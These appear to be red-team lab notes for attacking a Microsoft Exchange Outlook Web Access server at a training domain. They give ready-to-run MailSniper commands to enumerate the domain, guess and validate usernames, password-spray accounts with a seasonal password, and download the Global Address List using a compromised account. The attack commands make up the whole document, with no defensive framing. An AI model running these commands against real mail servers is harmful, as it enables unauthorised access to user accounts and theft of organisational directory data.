# Spraying passwords with MailSniper

```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1

Invoke-PasswordSprayOWA -ExchHostname mail.cyberbotic.io -UserList .\Desktop\valid.txt -Password Summer2022
```

---

# Enumerate NetBIOS

```bash
Invoke-DomainHarvestOWA -ExchHostname mail.cyberbotic.io
```

---

# Finding valid usernames (https://gist.github.com/superkojiman/11076951)

With a list of usernames like so:
Bob Farmer
Isable Yates
John King

```bash
./namemash.py names.txt > possible.txt

Invoke-UsernameHarvestOWA -ExchHostname mail.cyberbotic.io -Domain cyberbotic.io -UserList .\Desktop\possible.txt -OutFile .\Desktop\valid.txt

Invoke-PasswordSprayOWA -ExchHostname mail.cyberbotic.io -UserList .\Desktop\valid.txt -Password Summer2022
```

---

# Download Global Address List (Credentials needed)

```bash
Get-GlobalAddressList -ExchHostname mail.cyberbotic.io -UserName cyberbotic.io\iyates -Password Summer2022 -OutFile .\Desktop\gal.txt
```

---
